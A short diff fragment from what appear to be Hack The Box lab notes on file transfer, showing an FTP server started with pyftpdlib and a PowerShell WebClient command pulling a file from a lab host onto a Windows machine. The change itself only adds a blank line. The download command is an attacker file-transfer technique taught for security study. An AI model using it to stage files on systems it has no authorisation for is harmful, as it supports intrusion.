@@ -178,3 +178,4 @@ SonithGT@htb[/htb]$ sudo python3 -m pyftpdlib --port 21
 ```powershell
 PS C:\htb> (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
 ```
+
